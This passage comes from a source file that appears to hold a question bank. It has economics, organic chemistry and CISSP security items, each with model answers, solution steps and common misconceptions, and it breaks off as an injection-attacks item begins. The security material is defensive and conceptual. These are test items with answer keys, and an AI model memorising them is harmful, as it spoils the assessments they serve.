			"ΔP = 12 - 10 = 2, P_avg = (10 + 12)/2 = 11",
			"%ΔQ = -10/45 ≈ -0.2222",
			"%ΔP = 2/11 ≈ 0.1818",
			"Ed = -0.2222 / 0.1818 ≈ -1.22",
		],
		commonMisconceptions: [
			"Using initial values instead of midpoint averages",
			"Forgetting the negative sign (demand elasticity is typically negative)",
			"Confusing percentage change with absolute change",
		],
		prerequisites: ["percentages", "division", "elasticity concept"],
		difficulty: "on-grade",
	},

	// ── Organic Chemistry ──
	{
		id: "ochem-1",
		topic: "organic-chemistry",
		subtopic: "functional-groups",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"Identify all functional groups present in the molecule: CH₃CH₂OH (ethanol). What type of organic compound is this?",
		correctAnswer: "Hydroxyl group (-OH); it is an alcohol",
		solutionSteps: [
			"Examine the molecular formula CH₃CH₂OH",
			"Identify the carbon backbone: two carbons in a chain (ethane base)",
			"The -OH group bonded to a carbon is a hydroxyl group",
			"A molecule with a hydroxyl group on a saturated carbon is classified as an alcohol",
			"Specifically, this is a primary alcohol (the -OH is on a carbon bonded to only one other carbon)",
		],
		commonMisconceptions: [
			"Confusing alcohols (-OH on carbon) with carboxylic acids (-COOH)",
			"Not recognizing that -OH bonded to carbon is different from hydroxide ion OH⁻",
			"Confusing primary, secondary, and tertiary alcohol classification",
		],
		prerequisites: ["molecular structure", "bonding", "nomenclature"],
		difficulty: "foundational",
	},
	{
		id: "ochem-2",
		topic: "organic-chemistry",
		subtopic: "reaction-mechanisms",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"What is the major product when 2-bromobutane reacts with a strong base (NaOEt) via an E2 mechanism?",
		correctAnswer: "2-butene (trans/E-2-butene is the major product by Zaitsev's rule)",
		solutionSteps: [
			"E2 is a one-step bimolecular elimination: base removes a β-hydrogen while the leaving group departs simultaneously",
			"Identify the β-carbons adjacent to the carbon bearing the bromine",
			"Apply Zaitsev's rule: the more substituted alkene is the major product",
			"Removing H from C3 gives 2-butene (more substituted, disubstituted)",
			"Removing H from C1 gives 1-butene (less substituted, monosubstituted)",
			"Major product: 2-butene, with trans (E) isomer preferred due to less steric strain",
		],
		commonMisconceptions: [
			"Confusing E2 (concerted) with E1 (stepwise) mechanism",
			"Applying anti-Zaitsev (Hofmann) rule instead of Zaitsev's rule for a non-bulky base",
			"Forgetting to consider stereochemistry (anti-periplanar requirement)",
		],
		prerequisites: ["elimination reactions", "alkene stability", "stereochemistry"],
		difficulty: "stretch",
	},

	// ══════════════════════════════════════
	// ── PROFESSIONAL: CISSP DOMAINS ──
	// ══════════════════════════════════════

	// ── Domain 1: Security & Risk Management (~15% of exam) ──
	{
		id: "srm-1",
		topic: "cissp-security-risk-mgmt",
		subtopic: "quantitative-risk-analysis",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your organization's primary database server is valued at $800,000. A risk assessment estimates that a successful ransomware attack would damage 50% of the asset's value (Exposure Factor). Historical data suggests such an attack occurs approximately once every 4 years (ARO = 0.25). Calculate the Single Loss Expectancy (SLE) and Annualized Loss Expectancy (ALE). A vendor proposes a mitigation that costs $75,000/year and would reduce the ARO to 0.05. Is the investment justified?",
		correctAnswer:
			"SLE = $400,000. ALE (before) = $100,000/year. ALE (after) = $20,000/year. Risk reduction = $80,000/year. Since $80,000 > $75,000 cost, the mitigation is justified with a net benefit of $5,000/year.",
		solutionSteps: [
			"Calculate SLE: Asset Value × Exposure Factor = $800,000 × 0.50 = $400,000",
			"Calculate ALE before mitigation: SLE × ARO = $400,000 × 0.25 = $100,000/year",
			"Calculate ALE after mitigation: SLE × new ARO = $400,000 × 0.05 = $20,000/year",
			"Calculate risk reduction: $100,000 - $20,000 = $80,000/year saved",
			"Compare: $80,000 saved > $75,000 cost → net benefit of $5,000/year → justified",
		],
		commonMisconceptions: [
			"Confusing SLE with ALE — SLE is per-incident, ALE is annualized",
			"Forgetting to multiply SLE by ARO to get the annual figure",
			"Comparing the mitigation cost to the total asset value instead of the ALE reduction",
			"Thinking any reduction in risk justifies any cost — must compare the delta to the cost",
			"Using ARO as a percentage of asset value rather than as a frequency of occurrence",
		],
		prerequisites: ["risk-terminology", "basic-arithmetic", "cost-benefit-analysis"],
		difficulty: "foundational",
	},
	{
		id: "srm-2",
		topic: "cissp-security-risk-mgmt",
		subtopic: "bcp-drp",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"A hurricane has knocked out your organization's primary data center. You have four systems to recover: (A) the customer-facing e-commerce platform (RPO: 1 hour, RTO: 4 hours, revenue: $50K/hour), (B) the internal HR portal (RPO: 24 hours, RTO: 48 hours), (C) the payment processing gateway (RPO: 0, RTO: 1 hour, regulatory requirement), and (D) the development/staging environment (RPO: 24 hours, RTO: 72 hours). In what order should you recover these systems, and why?",
		correctAnswer:
			"Order: C (payment gateway), A (e-commerce), B (HR portal), D (dev/staging). The payment gateway has the strictest RTO (1 hour) and a regulatory zero-data-loss requirement. E-commerce is next due to high revenue impact. HR and dev are internal with lenient recovery targets.",
		solutionSteps: [
			"Assess each system's RTO — the tightest RTO must be recovered first",
			"System C has RTO of 1 hour and RPO of 0 (zero data loss) plus a regulatory mandate — highest priority",
			"System A has RTO of 4 hours and generates $50K/hour in revenue — second priority",
			"System B has RTO of 48 hours and is internal-only — third priority",
			"System D has RTO of 72 hours and is non-production — lowest priority",
			"Regulatory requirements elevate priority regardless of revenue impact",
		],
		commonMisconceptions: [
			"Prioritizing by revenue alone — regulatory requirements can override revenue considerations",
			"Confusing RPO and RTO: RPO is acceptable data loss, RTO is acceptable downtime",
			"Recovering all systems simultaneously instead of prioritizing — resources are limited during a disaster",
			"Treating the dev environment as critical because developers 'need it to fix things'",
			"Not recognizing that RPO = 0 implies synchronous replication or real-time backup must already be in place",
		],
		prerequisites: ["business-continuity-concepts", "recovery-objectives", "disaster-recovery"],
		difficulty: "on-grade",
	},
	{
		id: "srm-3",
		topic: "cissp-security-risk-mgmt",
		subtopic: "legal-regulatory",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your company, headquartered in New York, processes personal data of EU citizens through a subsidiary in Ireland and stores backups in Singapore. A French customer requests complete deletion of their data under GDPR Article 17 (Right to Erasure). Your legal team says a pending US lawsuit requires a litigation hold on all customer records. How do you navigate this conflict?",
		correctAnswer:
			"The litigation hold takes precedence — GDPR Article 17(3)(e) explicitly exempts erasure when data is needed for legal claims. Inform the customer their request cannot be fully completed due to a legal obligation, cite the legal basis, restrict the held data to litigation purposes only, and process the erasure once the hold is lifted.",
		solutionSteps: [
			"Identify the conflict: GDPR right to erasure vs. US litigation hold",
			"Check GDPR exceptions: Article 17(3)(e) allows retention for establishment, exercise, or defense of legal claims",
			"The litigation hold is a legitimate legal basis to defer erasure",
			"Respond to the data subject: acknowledge the request, explain the legal basis for retention under Article 17(3)(e)",
			"Apply data minimization: restrict the held data to only what's needed for litigation, erase everything else",
			"Document everything: maintain records of the request, the legal basis for denial, and the scope of retention",
			"Set a trigger: when the litigation hold is released, fulfill the erasure request",
		],
		commonMisconceptions: [
			"Thinking GDPR always overrides local laws — GDPR has explicit exemptions for legal obligations",
			"Deleting the data to comply with GDPR and violating the litigation hold — this can result in sanctions and adverse inference",
			"Ignoring the customer's request entirely — you must still respond within 30 days and explain the legal basis",
			"Thinking data residency (Singapore) changes the analysis — GDPR applies based on the data subject's location, not storage location",
			"Believing the Irish subsidiary can handle this independently — it's a cross-jurisdictional issue requiring coordinated response",
		],
		prerequisites: ["gdpr-fundamentals", "data-privacy-laws", "legal-holds"],
		difficulty: "stretch",
	},

	// ── Domain 2: Asset Security (~10% of exam) ──
	{
		id: "as-1",
		topic: "cissp-asset-security",
		subtopic: "data-classification",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"You discover that a marketing intern has been downloading customer databases — including names, email addresses, purchase history, and the last four digits of credit card numbers — to their personal laptop to build presentation charts. The data has no classification labels. As the security manager, what is the immediate issue, and what systemic failures allowed this to happen?",
		correctAnswer:
			"Immediate issue: sensitive PII/PCI data has been exfiltrated to an unmanaged personal device. Systemic failures: (1) no data classification policy — the data should be labeled Confidential/Restricted, (2) no DLP controls preventing bulk downloads to unmanaged devices, (3) no access control enforcement — an intern should not have direct database access, (4) no security awareness training on data handling.",
		solutionSteps: [
			"Identify the data types: PII (names, emails), purchase history, partial PCI data (last 4 of card numbers)",
			"This data should be classified as Confidential at minimum — partial card numbers still fall under PCI DSS scope",
			"Failure 1: No data classification scheme — if data isn't labeled, people can't know how to handle it",
			"Failure 2: No DLP (Data Loss Prevention) — bulk download to a personal device should have been blocked",
			"Failure 3: Access control failure — principle of least privilege violated; an intern doesn't need raw database access",
			"Failure 4: No security awareness training — the intern likely didn't understand the sensitivity of the data",
			"Immediate response: retrieve or wipe the data from the personal device, revoke the intern's database access",
		],
		commonMisconceptions: [
			"Blaming only the intern — this is a systemic failure, not an individual one",
			"Thinking last-four digits of credit cards aren't sensitive — they are PCI-relevant and can aid social engineering",
			"Focusing only on the technical fix (DLP) and ignoring governance (classification policy, training)",
			"Treating this as a security incident requiring forensic investigation — it's a policy violation, not an attack",
			"Assuming encryption on the laptop solves the problem — the data is still on an unmanaged device outside organizational control",
		],
		prerequisites: ["data-classification-levels", "pci-dss-basics", "dlp-concepts"],
		difficulty: "foundational",
	},
	{
		id: "as-2",
		topic: "cissp-asset-security",
		subtopic: "data-remanence",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your organization is decommissioning 200 hard drives from servers that previously stored healthcare records (ePHI under HIPAA). Your IT manager proposes formatting the drives and donating them to a local school. Is this acceptable? What method(s) should be used instead, and why?",
		correctAnswer:
			"No — formatting does not remove data (data remanence). For ePHI, drives must be sanitized per NIST SP 800-88: degaussing (for HDDs), cryptographic erasure (if encrypted at rest), or physical destruction (shredding/incineration). Physical destruction is the most certain method for data leaving organizational control.",
		solutionSteps: [
			"Formatting (quick or full) only removes file system pointers — data remains recoverable with forensic tools",
			"This is data remanence: residual data that persists after attempted deletion",
			"HIPAA requires ePHI be rendered unrecoverable when media is disposed of",
			"NIST SP 800-88 defines three sanitization levels: Clear, Purge, and Destroy",
			"Clear (overwriting) is insufficient for the highest-sensitivity data leaving organizational control",
			"Purge (degaussing for HDDs, cryptographic erasure for SEDs) renders data infeasible to recover",
			"Destroy (shredding, disintegration, incineration) provides the highest assurance",
			"For ePHI leaving the organization, Destroy is recommended",
			"Document the destruction: maintain a certificate of destruction with serial numbers for compliance",
		],
		commonMisconceptions: [
			"Thinking 'format' or 'delete' actually removes data — it only removes pointers",
			"Believing a single-pass overwrite is always sufficient — for regulatory data leaving your control, use stronger methods",
			"Confusing degaussing with formatting — degaussing uses a powerful magnetic field to destroy magnetic domains",
			"Thinking degaussing works on SSDs — it does not; SSDs require cryptographic erasure or physical destruction",
			"Forgetting the documentation requirement — without a certificate of destruction, you can't prove compliance",
		],
		prerequisites: ["data-lifecycle", "media-sanitization", "hipaa-basics"],
		difficulty: "on-grade",
	},

	// ── Domain 3: Security Architecture & Engineering (~13% of exam) ──
	{
		id: "sa-1",
		topic: "cissp-security-architecture",
		subtopic: "security-models",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"A military classified network enforces: (1) A user with 'Secret' clearance can read 'Secret' and 'Confidential' documents but cannot read 'Top Secret.' (2) A user with 'Top Secret' clearance writing a report cannot save it to a 'Secret' level folder. Which security model is this? Now: if a 'Secret' user tries to write a document to a 'Top Secret' folder, what happens and why?",
		correctAnswer:
			"This is the Bell-LaPadula model (confidentiality). 'No read up, no write down.' A Secret user CAN write to a Top Secret folder — writing up is allowed. This prevents information from flowing downward to less-privileged levels. Contrast with Biba (integrity model) which is the inverse: no read down, no write up.",
		solutionSteps: [
			"Identify the model: restrictions on reading up and writing down → Bell-LaPadula (BLP)",
			"BLP Simple Security Property: no read up — a subject cannot read data at a higher classification",
			"BLP Star (*) Property: no write down — a subject cannot write data to a lower classification level",
			"A Secret user reading Secret/Confidential but not Top Secret → Simple Security Property",
			"A Top Secret user unable to save to Secret folder → Star Property",
			"The twist: a Secret user CAN write to a Top Secret folder — writing UP is permitted",
			"This seems counterintuitive but prevents information leaking downward — confidentiality is the goal",
			"Contrast with Biba (integrity model): Biba is the inverse — no read down, no write up",
		],
		commonMisconceptions: [
			"Thinking Bell-LaPadula prevents writing up — it prevents writing DOWN; writing up is allowed",
			"Confusing Bell-LaPadula with Biba — BLP protects confidentiality, Biba protects integrity",
			"Assuming 'no write down' means 'no write at all' for higher-clearance users",
			"Thinking BLP addresses all security concerns — it only handles confidentiality, not integrity or availability",
			"Forgetting that BLP uses mandatory access controls (labels), not discretionary",
		],
		prerequisites: ["access-control-concepts", "classification-levels", "mandatory-access-control"],
		difficulty: "on-grade",
	},
	{
		id: "sa-2",
		topic: "cissp-security-architecture",
		subtopic: "cryptography",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your organization needs encryption for three use cases: (A) encrypting 500GB of database backups nightly, (B) allowing two employees to exchange signed contracts via email without a pre-shared secret, and (C) verifying that a downloaded software patch hasn't been tampered with. For each, would you use symmetric encryption, asymmetric encryption, or hashing — and which specific algorithm?",
		correctAnswer:
			"A) Symmetric — AES-256 for bulk data speed. B) Asymmetric — RSA or ECDSA for digital signatures providing non-repudiation without pre-shared keys. C) Hashing — SHA-256 for integrity verification. In practice, email encryption uses a hybrid approach: asymmetric for key exchange, symmetric for content.",
		solutionSteps: [
			"Use case A: Symmetric is correct — AES-256 is fast and designed for large data volumes",
			"Asymmetric would be too slow for 500GB; symmetric key management is feasible for an internal process",
			"Use case B: Asymmetric is correct — parties need digital signatures without pre-shared secrets",
			"RSA-2048+ or ECDSA for signing provides non-repudiation (the signer can't deny signing)",
			"In practice, S/MIME and PGP use hybrid: asymmetric for key exchange, symmetric for content encryption",
			"Use case C: Hashing is correct — SHA-256 produces a fixed-length digest for comparison",
			"If the download's hash matches the published hash, the file hasn't been tampered with",
			"Hashing alone doesn't prove authenticity — combining with a digital signature on the hash is ideal",
		],
		commonMisconceptions: [
			"Using asymmetric encryption for bulk data — it's orders of magnitude slower than symmetric",
			"Thinking hashing is encryption — hashing is one-way and cannot be reversed",
			"Not understanding why asymmetric solves key exchange — it eliminates the need for a pre-shared secret",
			"Recommending MD5 or SHA-1 — both have known collision vulnerabilities; SHA-256 is the minimum standard",
			"Confusing encryption (confidentiality) with hashing (integrity) and digital signatures (authentication + non-repudiation)",
		],
		prerequisites: ["symmetric-vs-asymmetric", "hash-functions", "digital-signatures"],
		difficulty: "foundational",
	},

	// ── Domain 4: Communication & Network Security (~13% of exam) ──
	{
		id: "ns-1",
		topic: "cissp-network-security",
		subtopic: "network-attacks",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Users in your office report banking websites showing certificate warnings despite typing correct URLs. Your network team finds the ARP table on the default gateway shows the same MAC address mapped to multiple IP addresses. What attack is occurring, how does it work, and what are the immediate and long-term countermeasures?",
		correctAnswer:
			"ARP spoofing/poisoning enabling a man-in-the-middle (MITM). The attacker sends gratuitous ARP replies to map their MAC to the gateway's IP, intercepting traffic and presenting forged TLS certificates. Immediate: identify and isolate the attacker's MAC, clear ARP caches. Long-term: Dynamic ARP Inspection (DAI), 802.1X port authentication, HSTS.",
		solutionSteps: [
			"Identify: certificate warnings + duplicate MAC in ARP table = ARP spoofing MITM attack",
			"ARP is stateless and trusts any reply — the attacker sends forged ARP replies",
			"The attacker's machine receives traffic intended for the gateway, inspects/modifies it, then forwards it",
			"Certificate warnings appear because the attacker intercepts TLS and presents their own certificate",
			"Immediate: identify the rogue MAC address, trace it to a physical switch port, isolate it",
			"Clear poisoned ARP caches on affected hosts and the gateway",
			"Long-term: Dynamic ARP Inspection (DAI) validates ARP packets against the DHCP snooping database",
			"802.1X port-based authentication prevents unauthorized devices from joining the network",
			"HSTS headers and certificate pinning help prevent users from clicking through certificate warnings",
		],
		commonMisconceptions: [
			"Thinking certificate warnings are 'just a browser issue' — they're a critical indicator of MITM",
			"Confusing ARP spoofing with DNS spoofing — ARP is Layer 2, DNS is Layer 7",
			"Thinking VLANs alone prevent ARP spoofing — it works within a VLAN/broadcast domain",
			"Assuming firewalls stop ARP spoofing — traditional firewalls operate at Layer 3+ and don't inspect ARP",
			"Not recognizing the attacker must be on the same local network segment for ARP spoofing",
		],
		prerequisites: ["arp-protocol", "osi-model", "tls-certificates", "network-switching"],
		difficulty: "on-grade",
	},
	{
		id: "ns-2",
		topic: "cissp-network-security",
		subtopic: "secure-protocols",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your company has remote employees connecting to the corporate network. You need to choose between an IPsec VPN and an SSL/TLS VPN. The remote workers use personal devices (BYOD), need access to only three specific web applications, and often connect from hotel and coffee shop Wi-Fi. Which VPN technology do you recommend and why?",
		correctAnswer:
			"SSL/TLS VPN. It works through a browser without requiring client installation (critical for BYOD), can restrict access to specific applications (better granularity than IPsec's network-level access), and traverses NAT and restrictive firewalls easily over HTTPS port 443.",
		solutionSteps: [
			"Constraint 1 — BYOD: IPsec requires client installation with admin privileges, problematic on personal devices",
			"SSL/TLS VPN can run clientless through a browser or with a lightweight agent, ideal for BYOD",
			"Constraint 2 — specific web apps only: IPsec provides full network-level (Layer 3) access, which is overprivileged",
			"SSL/TLS VPN operates at the application layer and can restrict access to specific URLs/applications",
			"This follows the principle of least privilege — users only reach what they need",
			"Constraint 3 — hotel/coffee shop networks: these often block non-standard ports and use NAT",
			"IPsec uses ESP/AH and ports 500/4500 that are often blocked by restrictive networks",
			"SSL/TLS VPN uses HTTPS (port 443) which is almost never blocked",
			"Additional: SSL/TLS VPN provides a smaller attack surface since it doesn't expose the full internal network",
		],
		commonMisconceptions: [
			"Thinking IPsec is always 'more secure' — both are secure; the choice depends on use case and constraints",
			"Not considering the BYOD constraint — IPsec client installation on personal devices creates management issues",
			"Ignoring NAT traversal — IPsec has NAT-T but it's additional complexity and not always supported",
			"Thinking SSL VPN is the same as 'just using HTTPS' — the VPN provides authentication, tunneling, and access control",
			"Choosing full-tunnel VPN when split-tunnel would be more appropriate for specific application access",
		],
		prerequisites: ["vpn-technologies", "ipsec-fundamentals", "tls-fundamentals"],
		difficulty: "foundational",
	},

	// ── Domain 5: Identity & Access Management (~13% of exam) ──
	{
		id: "iam-1",
		topic: "cissp-iam",
		subtopic: "access-control-models",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"A hospital needs access controls for electronic health records. Requirements: (1) Doctors can only view records of patients currently assigned to them. (2) In an emergency, any ER doctor can access any patient's record, but it must be logged and reviewed. (3) Billing staff can see diagnosis codes and procedures but not clinical notes. (4) Patients can view their own records but not others'. Which access control model(s) best satisfy these requirements?",
		correctAnswer:
			"A combination of RBAC and ABAC. RBAC handles base roles (doctor, billing, patient). ABAC adds contextual attributes: the doctor-patient assignment relationship, the ER emergency context, and field-level filtering for billing. The 'break-the-glass' emergency access uses ABAC with mandatory audit logging. MAC is too rigid; DAC too permissive.",
		solutionSteps: [
			"Requirement 1: access based on role (doctor) AND relationship (assigned patients) → needs more than simple RBAC",
			"Pure RBAC would give all doctors access to all records — too broad",
			"ABAC evaluates attributes: user.role=doctor AND patient.assignedDoctor=user.id",
			"Requirement 2: context-dependent access (ER + emergency) → ABAC 'break-the-glass' pattern",
			"Emergency override grants temporary elevated access based on context with full audit trail",
			"Requirement 3: same role category but different data visibility → field-level access control via ABAC policies",
			"Requirement 4: patient self-access → ABAC where user.id = record.patientId",
			"RBAC provides the foundation (role hierarchy), ABAC provides fine-grained contextual rules",
			"MAC is too rigid for healthcare — it doesn't accommodate the emergency override pattern",
			"DAC is too permissive — record owners shouldn't be able to share access freely with HIPAA data",
		],
		commonMisconceptions: [
			"Thinking RBAC alone is sufficient — it doesn't handle the doctor-patient relationship or emergency context",
			"Choosing MAC because healthcare is 'high security' — MAC's rigid labels don't support break-the-glass patterns",
			"Choosing DAC because it's flexible — DAC lets users grant access, violating healthcare privacy regulations",
			"Forgetting the audit requirement for emergency access — break-the-glass without logging is just an unrestricted override",
			"Not recognizing that ABAC can subsume RBAC — role can be one of many attributes in an ABAC policy",
		],
		prerequisites: ["rbac", "abac", "mac-dac", "least-privilege"],
		difficulty: "on-grade",
	},
	{
		id: "iam-2",
		topic: "cissp-iam",
		subtopic: "authentication",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your organization is implementing MFA. A manager proposes: 'We'll require a password and a 4-digit PIN.' Is this true multi-factor authentication? Explain the three authentication factor categories and design a proper MFA scheme for remote VPN access.",
		correctAnswer:
			"No — password and PIN are both 'something you know' (knowledge factor). True MFA requires at least two DIFFERENT categories: something you know (password), something you have (token/phone), something you are (biometric). For VPN: password (knowledge) + TOTP app or hardware token (possession). Hardware tokens like FIDO2 keys are phishing-resistant.",
		solutionSteps: [
			"Three factor categories: knowledge (something you know), possession (something you have), inherence (something you are)",
			"Password + PIN = two knowledge factors = single-factor authentication used twice",
			"Multi-factor requires factors from DIFFERENT categories",
			"Factor 1 (knowledge): password meeting complexity requirements",
			"Factor 2 (possession): TOTP authenticator app, hardware security key (FIDO2/U2F), or push notification",
			"Optional Factor 3 (inherence): fingerprint or face recognition for highest-privilege access",
			"Hardware tokens (YubiKey) are phishing-resistant — TOTP codes can be phished in real-time relay attacks",
			"SMS OTP is weaker due to SIM swapping and SS7 interception — avoid if possible",
		],
		commonMisconceptions: [
			"Thinking two passwords or password + PIN counts as MFA — they're the same factor category",
			"Believing SMS OTP is as strong as a hardware token — SMS is vulnerable to SIM swapping",
			"Confusing identification with authentication — entering a username is identification, proving identity is authentication",
			"Thinking biometrics are 'unhackable' — they can be spoofed and can't be changed if compromised",
			"Not understanding 'something you have' means physically possessed, not a second password stored elsewhere",
		],
		prerequisites: ["authentication-basics", "factor-categories", "credential-management"],
		difficulty: "foundational",
	},

	// ── Domain 6: Security Assessment & Testing (~12% of exam) ──
	{
		id: "sat-1",
		topic: "cissp-security-assessment",
		subtopic: "assessment-types",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"The board asks: 'We need to test our security — should we do a vulnerability assessment or a penetration test?' Your organization has never had formal security testing. The environment includes a public-facing web app, an internal corporate network, and AWS cloud infrastructure. What do you recommend and in what order?",
		correctAnswer:
			"Start with a vulnerability assessment — it identifies and catalogs weaknesses systematically (broader scope, lower risk). A pen test exploits vulnerabilities to demonstrate real impact but is pointless before addressing known issues. Sequence: vulnerability assessment → remediate critical findings → rescan → penetration test to validate defenses.",
		solutionSteps: [
			"Vulnerability assessment: broad, automated scanning to identify known weaknesses — answers 'what's exposed?'",
			"Penetration test: targeted, manual exploitation to demonstrate impact — answers 'can an attacker get in?'",
			"For an organization with no prior testing, start with vulnerability assessment for a baseline",
			"Running a pen test first wastes expensive manual testing time finding things a scanner would catch",
			"Recommended sequence: vulnerability scan → remediate critical/high findings → rescan → penetration test",
			"Scope: public web app needs both, internal network needs credentialed vuln scanning, AWS needs cloud-specific assessment (misconfigs, IAM policies)",
			"Ensure proper authorization: written scope agreement, rules of engagement, and management approval before any testing",
			"After pen test: remediate findings, then establish ongoing vulnerability management (continuous scanning)",
		],
		commonMisconceptions: [
			"Thinking vulnerability assessment and penetration testing are the same thing",
			"Jumping to pen testing without a vulnerability baseline — expensive pen testers shouldn't do a scanner's job",
			"Believing automated scanning alone is sufficient — scanners miss logic flaws, chained exploits, and business logic issues",
			"Thinking pen testing is 'one and done' — it's a point-in-time assessment needing regular repetition",
			"Forgetting written authorization — testing without authorization is legally indistinguishable from an actual attack",
		],
		prerequisites: ["security-testing-concepts", "vulnerability-scanning", "risk-assessment"],
		difficulty: "foundational",
	},
	{
		id: "sat-2",
		topic: "cissp-security-assessment",
		subtopic: "audit-compliance",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"Your SaaS company is preparing for a SOC 2 Type II audit. The CEO asks: 'What's the difference between Type I and Type II? How long will this take? And what are the Trust Services Criteria?' Explain the process and timeline.",
		correctAnswer:
			"Type I evaluates control design at a single point in time. Type II evaluates operating effectiveness over 6-12 months — proving controls work consistently. Trust Services Criteria: Security (required), Availability, Processing Integrity, Confidentiality, Privacy (chosen based on scope). First SOC 2 Type II takes approximately 12-18 months end-to-end. Enterprise customers require Type II.",
		solutionSteps: [
			"SOC 2 is an attestation report by an independent CPA firm on a service organization's controls",
			"Type I: point-in-time assessment of control design — faster but weaker assurance",
			"Type II: assessment of operating effectiveness over time (6-12 month observation) — stronger assurance",
			"Most enterprise buyers require Type II because it proves controls work consistently",
			"5 Trust Services Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy",
			"Security (Common Criteria) is mandatory — the other four are selected based on relevance",
			"Typical timeline: 3-6 months to prepare, 6-12 month observation window, 4-8 weeks for audit fieldwork",
			"Total for first SOC 2 Type II: approximately 12-18 months from start to report",
			"Key preparation: identify control gaps, implement missing controls, collect evidence throughout observation period",
		],
		commonMisconceptions: [
			"Confusing SOC 1 with SOC 2 — SOC 1 is for financial reporting controls, SOC 2 is for operational/security controls",
			"Thinking Type I is 'enough' for enterprise customers — most require Type II",
			"Believing SOC 2 is a certification — it's an attestation report; you don't 'pass' or 'fail'",
			"Thinking all five Trust Services Criteria are required — only Security is mandatory",
			"Underestimating the timeline — first SOC 2 Type II typically takes 12-18 months end-to-end",
		],
		prerequisites: ["audit-types", "compliance-frameworks", "control-objectives"],
		difficulty: "on-grade",
	},

	// ── Domain 7: Security Operations (~13% of exam) ──
	{
		id: "so-1",
		topic: "cissp-security-operations",
		subtopic: "incident-response",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"At 2:00 AM, your SOC detects a workstation in Finance encrypting files on a shared network drive at abnormal speed. Hostname: FIN-WS-042, logged-in user: 'sarah.chen', encrypting process: 'svchost32.exe' (note: not the legitimate svchost.exe). Walk through the NIST SP 800-61 incident response phases for handling this ransomware event.",
		correctAnswer:
			"Active ransomware. NIST phases: (1) Preparation — IR plan, backups, communication tree should exist. (2) Detection & Analysis — confirm via suspicious process name and encryption behavior, determine scope. (3) Containment — isolate FIN-WS-042, disable sarah.chen's credentials, block malware hash, disconnect shared drive. (4) Eradication — find infection vector, remove malware, check persistence. (5) Recovery — restore from backups, rebuild workstation. (6) Lessons Learned — document timeline, update defenses.",
		solutionSteps: [
			"Phase 1 — Preparation: IR plan, trained team, communication tree, offline backups should already exist",
			"Phase 2 — Detection & Analysis: svchost32.exe masquerades as legitimate svchost.exe — clear indicator of compromise",
			"Rapid encryption on a network share confirms ransomware behavior",
			"Determine scope: what other systems has sarah.chen's account accessed? Is it spreading?",
			"Phase 3 — Containment (short-term): network-isolate FIN-WS-042 immediately",
			"Disable sarah.chen's AD credentials to prevent lateral movement",
			"Disconnect or set the shared drive to read-only to halt encryption",
			"Phase 3 — Containment (long-term): block the malware's hash and C2 indicators across all endpoints",
			"Phase 4 — Eradication: determine entry point (phishing? exploit? RDP?), remove root cause, check for persistence mechanisms",
			"Phase 5 — Recovery: restore encrypted files from clean backups, rebuild workstation from known-good image, verify before reconnecting",
			"Phase 6 — Lessons Learned: post-incident review within 1-2 weeks, update IR playbook",
		],
		commonMisconceptions: [
			"Immediately shutting down the machine — this destroys volatile forensic evidence in memory",
			"Trying to decrypt files or paying the ransom as a first response — containment comes first",
			"Forgetting to disable the user's credentials — the ransomware may use them for lateral movement",
			"Not checking for lateral spread — ransomware often propagates before it starts encrypting",
			"Skipping the lessons-learned phase — it's where you prevent the next incident",
			"Treating svchost32.exe as legitimate — the misspelling is a classic attacker evasion technique",
		],
		prerequisites: ["nist-ir-framework", "malware-types", "containment-strategies"],
		difficulty: "on-grade",
	},
	{
		id: "so-2",
		topic: "cissp-security-operations",
		subtopic: "digital-forensics",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
			"During the ransomware incident on FIN-WS-042, your legal team says they may pursue criminal charges. Before the forensic investigator arrives, what steps must you take to preserve digital evidence? What is the order of volatility and why does it matter?",
		correctAnswer:
			"Order of volatility (most to least): CPU registers/cache → RAM → network state → running processes → disk → removable media → printouts. Capture most volatile first — it disappears when powered off. Steps: do NOT power off, photograph the screen, capture RAM dump, record network connections, create forensic disk image with write-blockers, hash everything (SHA-256), document chain of custody for every evidence transfer.",
		solutionSteps: [
			"Critical: do NOT power off or reboot — this destroys volatile evidence",
			"Order of volatility determines capture priority (RFC 3227 / NIST SP 800-86)",
			"Most volatile: CPU registers and cache (lost when context switches)",
			"Next: RAM — contains running malware, encryption keys, network connections",
			"Next: network state and running processes",
			"Least volatile: disk contents, removable media, printouts",
			"Capture: photograph the screen, dump RAM using forensic tools (FTK Imager, AVML)",
			"Record active network connections and running processes",
			"Create a forensic disk image using a write-blocker to prevent modifying the original",
			"Generate SHA-256 hashes of all evidence files immediately — proves integrity in court",
			"Chain of custody: log every person who handles evidence, when, and what they did",
			"Store evidence in a secure, access-controlled location with tamper-evident seals",
		],
		commonMisconceptions: [
			"Powering off to 'stop the damage' — this destroys volatile evidence critical for investigation",
			"Not understanding order of volatility — imaging disk first and powering off loses RAM and network state",
			"Creating a regular copy instead of a bit-for-bit forensic image — misses slack space, deleted files, metadata",
			"Forgetting write-blockers — imaging without one can modify evidence and invalidate it in court",
			"Not hashing evidence — without hash verification, defense can argue evidence was tampered with",
			"Breaking chain of custody — any gap in documentation can render evidence inadmissible",
		],
		prerequisites: ["forensic-concepts", "evidence-handling", "legal-requirements"],
		difficulty: "stretch",
	},

	// ── Domain 8: Software Development Security (~11% of exam) ──
	{
		id: "sds-1",
		topic: "cissp-software-security",
		subtopic: "injection-attacks",
		educationLevel: "professional",
		gradeLevel: 0,
		question:
